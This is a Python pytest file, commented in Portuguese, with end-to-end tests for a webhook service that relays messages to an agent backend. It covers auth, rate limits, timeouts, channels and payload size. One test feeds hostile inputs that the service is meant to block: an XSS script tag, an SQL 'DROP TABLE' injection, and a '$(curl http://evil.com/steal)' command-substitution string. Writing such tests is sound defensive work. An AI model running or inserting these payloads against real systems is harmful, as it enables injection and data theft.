"""
Testes de integração end-to-end para fluxo completo de webhooks.

Este módulo contém testes que simulam o fluxo completo desde a chamada
externa do webhook até a resposta do agente, incluindo todas as camadas
do sistema (middleware, validação, rate limiting, execução do agente).
"""

import pytest
import asyncio
import json
import time
from datetime import datetime, timedelta
from typing import Dict, Any, List
from unittest.mock import Mock, patch, AsyncMock
from uuid import uuid4

import redis.asyncio as redis
from fastapi.testclient import TestClient
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
from sqlalchemy.orm import sessionmaker

from app.main import app
from app.models.integrations import Integration, WebhookCall, WebhookToken
from app.services.webhook_service import WebhookService
from app.services.integration_service import IntegrationService
from app.core.database import get_async_session
from app.core.config import settings


class TestWebhookEndToEndFlow:
    """Testes end-to-end para fluxo completo de webhooks."""
    
    @pytest.fixture(autouse=True)
    async def setup_test_environment(self):
        """Setup completo do ambiente de teste."""
        
        # Configurar banco de dados de teste
        self.test_engine = create_async_engine(
            "sqlite+aiosqlite:///./test_e2e.db",
            echo=False
        )
        
        self.TestSessionLocal = sessionmaker(
            self.test_engine,
            class_=AsyncSession,
            expire_on_commit=False
        )
        
        # Configurar Redis de teste
        self.redis_client = redis.Redis(
            host="localhost",
            port=6379,
            db=15,  # DB separado para testes
            decode_responses=True
        )
        
        # Limpar Redis de teste
        await self.redis_client.flushdb()
        
        # Override dependencies
        async def override_get_session():
            async with self.TestSessionLocal() as session:
                yield session
        
        async def override_get_redis():
            return self.redis_client
        
        app.dependency_overrides[get_async_session] = override_get_session
        
        # Criar cliente de teste
        self.client = TestClient(app)
        
        # Criar dados de teste
        await self._create_test_data()
        
        yield
        
        # Cleanup
        await self.redis_client.flushdb()
        await self.redis_client.close()
        await self.test_engine.dispose()
        app.dependency_overrides.clear()
    
    async def _create_test_data(self):
        """Cria dados de teste no banco."""
        async with self.TestSessionLocal() as session:
            # Criar integração de teste
            self.test_integration = Integration(
                id=str(uuid4()),
                name="E2E Test Integration",
                channel="whatsapp",
                agent_id=str(uuid4()),
                webhook_url="https://test-webhook.com/webhook",
                is_active=True,
                rate_limit_per_minute=60,
                created_at=datetime.utcnow(),
                updated_at=datetime.utcnow()
            )
            
            session.add(self.test_integration)
            
            # Criar token de teste
            self.test_token = WebhookToken(
                integration_id=self.test_integration.id,
                token="whk_test_token_e2e_12345678901234567890",
                token_type="bearer",
                is_active=True,
                expires_at=datetime.utcnow() + timedelta(days=30),
                created_at=datetime.utcnow()
            )
            
            session.add(self.test_token)
            await session.commit()
            
            # Refresh para obter IDs
            await session.refresh(self.test_integration)
            await session.refresh(self.test_token)
    
    @patch('app.services.webhook_service.suna_client')
    async def test_complete_webhook_flow_success(self, mock_suna_client):
        """Testa fluxo completo de webhook com sucesso."""
        
        # Mock da resposta do Suna Core
        mock_suna_response = {
            "success": True,
            "response": "Olá! Recebi sua mensagem via WhatsApp.",
            "agent_id": self.test_integration.agent_id,
            "execution_time_ms": 150,
            "metadata": {
                "model_used": "gpt-4",
                "tokens_used": 45
            }
        }
        
        mock_suna_client.execute_agent = AsyncMock(return_value=mock_suna_response)
        
        # Payload de teste
        test_payload = {
            "message": "Olá, como você está?",
            "phone": "+5511999999999",
            "message_type": "text",
            "timestamp": datetime.utcnow().isoformat()
        }
        
        # Fazer requisição webhook
        response = self.client.post(
            f"/webhook/{self.test_integration.agent_id}/whatsapp",
            json=test_payload,
            headers={
                "Authorization": f"Bearer {self.test_token.token}",
                "Content-Type": "application/json",
                "User-Agent": "WhatsApp-Webhook/1.0"
            }
        )
        
        # Verificar resposta
        assert response.status_code == 200
        response_data = response.json()
        
        assert response_data["success"] is True
        assert "data" in response_data
        assert response_data["data"]["response"] == "Olá! Recebi sua mensagem via WhatsApp."
        assert "execution_time_ms" in response_data
        assert response_data["execution_time_ms"] > 0
        
        # Verificar headers de segurança
        assert "X-Content-Type-Options" in response.headers
        assert "X-Frame-Options" in response.headers
        assert "X-XSS-Protection" in response.headers
        
        # Verificar headers de rate limit
        assert "X-RateLimit-Limit" in response.headers
        assert "X-RateLimit-Remaining" in response.headers
        assert "X-RateLimit-Reset" in response.headers
        
        # Verificar se chamada foi registrada no banco
        async with self.TestSessionLocal() as session:
            webhook_calls = await session.execute(
                select(WebhookCall).where(
                    WebhookCall.integration_id == self.test_integration.id
                )
            )
            calls = webhook_calls.scalars().all()
            
            assert len(calls) == 1
            call = calls[0]
            
            assert call.status_code == 200
            assert call.execution_time_ms > 0
            assert call.payload == test_payload
            assert call.response is not None
            assert call.ip_address is not None
            assert call.user_agent == "WhatsApp-Webhook/1.0"
        
        # Verificar se Suna Core foi chamado corretamente
        mock_suna_client.execute_agent.assert_called_once()
        call_args = mock_suna_client.execute_agent.call_args
        
        assert call_args[1]["agent_id"] == self.test_integration.agent_id
        assert call_args[1]["payload"] == test_payload
        assert call_args[1]["channel"] == "whatsapp"
    
    async def test_webhook_flow_with_invalid_token(self):
        """Testa fluxo com token inválido."""
        
        test_payload = {
            "message": "Test message",
            "phone": "+5511999999999"
        }
        
        response = self.client.post(
            f"/webhook/{self.test_integration.agent_id}/whatsapp",
            json=test_payload,
            headers={
                "Authorization": "Bearer whk_invalid_token_123",
                "Content-Type": "application/json"
            }
        )
        
        # Deve retornar 403 Forbidden
        assert response.status_code == 403
        response_data = response.json()
        
        assert response_data["success"] is False
        assert response_data["code"] == "INVALID_TOKEN"
        assert "Token inválido" in response_data["error"]
        
        # Verificar que nenhuma chamada foi registrada
        async with self.TestSessionLocal() as session:
            webhook_calls = await session.execute(
                select(WebhookCall).where(
                    WebhookCall.integration_id == self.test_integration.id
                )
            )
            calls = webhook_calls.scalars().all()
            assert len(calls) == 0
    
    async def test_webhook_flow_with_rate_limiting(self):
        """Testa fluxo com rate limiting ativo."""
        
        # Configurar rate limit baixo para teste
        async with self.TestSessionLocal() as session:
            integration = await session.get(Integration, self.test_integration.id)
            integration.rate_limit_per_minute = 2  # Apenas 2 chamadas por minuto
            await session.commit()
        
        test_payload = {
            "message": "Rate limit test",
            "phone": "+5511999999999"
        }
        
        headers = {
            "Authorization": f"Bearer {self.test_token.token}",
            "Content-Type": "application/json"
        }
        
        # Primeira chamada - deve passar
        with patch('app.services.webhook_service.suna_client') as mock_suna:
            mock_suna.execute_agent = AsyncMock(return_value={
                "success": True,
                "response": "First call"
            })
            
            response1 = self.client.post(
                f"/webhook/{self.test_integration.agent_id}/whatsapp",
                json=test_payload,
                headers=headers
            )
            
            assert response1.status_code == 200
            assert int(response1.headers["X-RateLimit-Remaining"]) == 1
        
        # Segunda chamada - deve passar
        with patch('app.services.webhook_service.suna_client') as mock_suna:
            mock_suna.execute_agent = AsyncMock(return_value={
                "success": True,
                "response": "Second call"
            })
            
            response2 = self.client.post(
                f"/webhook/{self.test_integration.agent_id}/whatsapp",
                json=test_payload,
                headers=headers
            )
            
            assert response2.status_code == 200
            assert int(response2.headers["X-RateLimit-Remaining"]) == 0
        
        # Terceira chamada - deve ser bloqueada
        response3 = self.client.post(
            f"/webhook/{self.test_integration.agent_id}/whatsapp",
            json=test_payload,
            headers=headers
        )
        
        assert response3.status_code == 429
        response_data = response3.json()
        
        assert response_data["success"] is False
        assert response_data["code"] == "RATE_LIMIT_EXCEEDED"
        assert "Rate limit excedido" in response_data["error"]
        
        # Verificar headers de rate limit
        assert response3.headers["X-RateLimit-Remaining"] == "0"
        assert "Retry-After" in response3.headers
    
    async def test_webhook_flow_with_malicious_payload(self):
        """Testa fluxo com payload malicioso."""
        
        malicious_payloads = [
            {
                "message": "<script>alert('XSS')</script>",
                "phone": "+5511999999999"
            },
            {
                "message": "'; DROP TABLE users; --",
                "phone": "+5511999999999"
            },
            {
                "message": "$(curl http://evil.com/steal)",
                "phone": "+5511999999999"
            }
        ]
        
        headers = {
            "Authorization": f"Bearer {self.test_token.token}",
            "Content-Type": "application/json"
        }
        
        for payload in malicious_payloads:
            response = self.client.post(
                f"/webhook/{self.test_integration.agent_id}/whatsapp",
                json=payload,
                headers=headers
            )
            
            # Deve ser bloqueado pelo middleware de segurança
            assert response.status_code == 400
            response_data = response.json()
            
            assert response_data["success"] is False
            assert response_data["code"] in ["ATTACK_DETECTED", "SECURITY_VALIDATION_FAILED"]
    
    @patch('app.services.webhook_service.suna_client')
    async def test_webhook_flow_with_suna_timeout(self, mock_suna_client):
        """Testa fluxo com timeout do Suna Core."""
        
        # Mock timeout do Suna Core
        mock_suna_client.execute_agent = AsyncMock(
            side_effect=asyncio.TimeoutError("Suna Core timeout")
        )
        
        test_payload = {
            "message": "Timeout test",
            "phone": "+5511999999999"
        }
        
        response = self.client.post(
            f"/webhook/{self.test_integration.agent_id}/whatsapp",
            json=test_payload,
            headers={
                "Authorization": f"Bearer {self.test_token.token}",
                "Content-Type": "application/json"
            }
        )
        
        # Deve retornar erro de timeout
        assert response.status_code == 500
        response_data = response.json()
        
        assert response_data["success"] is False
        assert response_data["code"] == "PROCESSING_ERROR"
        
        # Verificar que chamada foi registrada com erro
        async with self.TestSessionLocal() as session:
            webhook_calls = await session.execute(
                select(WebhookCall).where(
                    WebhookCall.integration_id == self.test_integration.id
                )
            )
            calls = webhook_calls.scalars().all()
            
            assert len(calls) == 1
            call = calls[0]
            
            assert call.status_code == 500
            assert call.error_message is not None
            assert "timeout" in call.error_message.lower()
    
    async def test_webhook_flow_with_different_channels(self):
        """Testa fluxo com diferentes canais de integração."""
        
        # Criar integrações para diferentes canais
        channels_data = [
            {
                "channel": "telegram",
                "payload": {
                    "message": "Telegram test",
                    "chat_id": 123456789,
                    "user_id": 987654321
                }
            },
            {
                "channel": "zapier",
                "payload": {
                    "trigger_event": "new_contact",
                    "data": {"name": "John Doe", "email": "john@example.com"}
                }
            },
            {
                "channel": "n8n",
                "payload": {
                    "workflow_id": "workflow_123",
                    "execution_id": "exec_456",
                    "data": {"step": "webhook_received"}
                }
            }
        ]
        
        for channel_data in channels_data:
            # Criar integração para o canal
            async with self.TestSessionLocal() as session:
                channel_integration = Integration(
                    id=str(uuid4()),
                    name=f"E2E {channel_data['channel'].title()} Integration",
                    channel=channel_data['channel'],
                    agent_id=self.test_integration.agent_id,
                    webhook_url=f"https://test-{channel_data['channel']}.com/webhook",
                    is_active=True,
                    rate_limit_per_minute=60,
                    created_at=datetime.utcnow(),
                    updated_at=datetime.utcnow()
                )
                
                session.add(channel_integration)
                
                # Criar token para o canal
                channel_token = WebhookToken(
                    integration_id=channel_integration.id,
                    token=f"whk_{channel_data['channel']}_token_123456789",
                    token_type="bearer",
                    is_active=True,
                    expires_at=datetime.utcnow() + timedelta(days=30),
                    created_at=datetime.utcnow()
                )
                
                session.add(channel_token)
                await session.commit()
                
                await session.refresh(channel_integration)
                await session.refresh(channel_token)
            
            # Testar webhook para o canal
            with patch('app.services.webhook_service.suna_client') as mock_suna:
                mock_suna.execute_agent = AsyncMock(return_value={
                    "success": True,
                    "response": f"Response from {channel_data['channel']} channel"
                })
                
                response = self.client.post(
                    f"/webhook/{channel_integration.agent_id}/{channel_data['channel']}",
                    json=channel_data['payload'],
                    headers={
                        "Authorization": f"Bearer {channel_token.token}",
                        "Content-Type": "application/json"
                    }
                )
                
                assert response.status_code == 200
                response_data = response.json()
                
                assert response_data["success"] is True
                assert channel_data['channel'] in response_data["data"]["response"]
                
                # Verificar se Suna foi chamado com canal correto
                mock_suna.execute_agent.assert_called_once()
                call_args = mock_suna.execute_agent.call_args
                assert call_args[1]["channel"] == channel_data['channel']
    
    async def test_concurrent_webhook_calls(self):
        """Testa chamadas webhook concorrentes."""
        
        async def make_webhook_call(call_id: int):
            """Faz uma chamada webhook individual."""
            with patch('app.services.webhook_service.suna_client') as mock_suna:
                mock_suna.execute_agent = AsyncMock(return_value={
                    "success": True,
                    "response": f"Concurrent response {call_id}",
                    "call_id": call_id
                })
                
                payload = {
                    "message": f"Concurrent test {call_id}",
                    "phone": "+5511999999999",
                    "call_id": call_id
                }
                
                response = self.client.post(
                    f"/webhook/{self.test_integration.agent_id}/whatsapp",
                    json=payload,
                    headers={
                        "Authorization": f"Bearer {self.test_token.token}",
                        "Content-Type": "application/json"
                    }
                )
                
                return {
                    "call_id": call_id,
                    "status_code": response.status_code,
                    "response_data": response.json() if response.status_code == 200 else None,
                    "success": response.status_code == 200
                }
        
        # Fazer 10 chamadas concorrentes
        concurrent_calls = 10
        tasks = [make_webhook_call(i) for i in range(concurrent_calls)]
        
        start_time = time.time()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        end_time = time.time()
        
        # Analisar resultados
        successful_calls = [r for r in results if isinstance(r, dict) and r["success"]]
        failed_calls = [r for r in results if isinstance(r, dict) and not r["success"]]
        exceptions = [r for r in results if isinstance(r, Exception)]
        
        total_time = (end_time - start_time) * 1000  # ms
        
        print(f"Concurrent calls results:")
        print(f"  Total calls: {concurrent_calls}")
        print(f"  Successful: {len(successful_calls)}")
        print(f"  Failed: {len(failed_calls)}")
        print(f"  Exceptions: {len(exceptions)}")
        print(f"  Total time: {total_time:.2f}ms")
        print(f"  Average time per call: {total_time/concurrent_calls:.2f}ms")
        
        # Verificações
        assert len(successful_calls) >= 8  # Pelo menos 80% de sucesso
        assert len(exceptions) == 0  # Nenhuma exceção não tratada
        
        # Verificar que todas as chamadas foram registradas
        async with self.TestSessionLocal() as session:
            webhook_calls = await session.execute(
                select(WebhookCall).where(
                    WebhookCall.integration_id == self.test_integration.id
                )
            )
            calls = webhook_calls.scalars().all()
            
            # Deve ter pelo menos as chamadas bem-sucedidas
            assert len(calls) >= len(successful_calls)
            
            # Verificar que call_ids são únicos
            call_ids = [json.loads(call.payload).get("call_id") for call in calls]
            assert len(set(call_ids)) == len(call_ids)
    
    async def test_webhook_flow_with_large_payload(self):
        """Testa fluxo com payload grande."""
        
        # Criar payload próximo ao limite (1MB)
        large_message = "A" * (900 * 1024)  # 900KB
        
        large_payload = {
            "message": large_message,
            "phone": "+5511999999999",
            "metadata": {
                "size_test": True,
                "original_size": len(large_message)
            }
        }
        
        with patch('app.services.webhook_service.suna_client') as mock_suna:
            mock_suna.execute_agent = AsyncMock(return_value={
                "success": True,
                "response": "Large payload processed successfully"
            })
            
            response = self.client.post(
                f"/webhook/{self.test_integration.agent_id}/whatsapp",
                json=large_payload,
                headers={
                    "Authorization": f"Bearer {self.test_token.token}",
                    "Content-Type": "application/json"
                }
            )
            
            # Deve processar com sucesso
            assert response.status_code == 200
            response_data = response.json()
            
            assert response_data["success"] is True
            assert "Large payload processed" in response_data["data"]["response"]
        
        # Testar payload muito grande (deve ser rejeitado)
        oversized_payload = {
            "message": "B" * (2 * 1024 * 1024),  # 2MB
            "phone": "+5511999999999"
        }
        
        response = self.client.post(
            f"/webhook/{self.test_integration.agent_id}/whatsapp",
            json=oversized_payload,
            headers={
                "Authorization": f"Bearer {self.test_token.token}",
                "Content-Type": "application/json"
            }
        )
        
        # Deve ser rejeitado
        assert response.status_code == 413  # Payload Too Large
        response_data = response.json()
        
        assert response_data["success"] is False
        assert response_data["code"] == "PAYLOAD_TOO_LARGE"


class TestWebhookIntegrationMetrics:
    """Testes de integração para métricas e analytics."""
    
    @pytest.fixture(autouse=True)
    async def setup_metrics_test(self):
        """Setup para testes de métricas."""
        # Similar ao setup anterior, mas focado em métricas
        # ... (implementação similar ao setup anterior)
        pass
    
    async def test_metrics_collection_during_webhook_flow(self):
        """Testa coleta de métricas durante fluxo de webhook."""
        
        # Fazer várias chamadas webhook
        # Verificar se métricas são coletadas corretamente
        # Testar agregação de dados
        # Verificar precisão dos cálculos
        pass
    
    async def test_real_time_analytics_updates(self):
        """Testa atualizações em tempo real de analytics."""
        
        # Fazer chamadas webhook
        # Verificar se analytics são atualizados imediatamente
        # Testar diferentes tipos de métricas
        pass


class TestWebhookErrorRecovery:
    """Testes de recuperação de erros em webhooks."""
    
    async def test_database_connection_recovery(self):
        """Testa recuperação de conexão com banco de dados."""
        
        # Simular perda de conexão com banco
        # Verificar se sistema se recupera
        # Testar se dados não são perdidos
        pass
    
    async def test_redis_connection_recovery(self):
        """Testa recuperação de conexão com Redis."""
        
        # Simular perda de conexão com Redis
        # Verificar se rate limiting continua funcionando
        # Testar recuperação automática
        pass
    
    async def test_suna_core_recovery(self):
        """Testa recuperação de falhas do Suna Core."""
        
        # Simular falhas do Suna Core
        # Verificar retry logic
        # Testar fallback mechanisms
        pass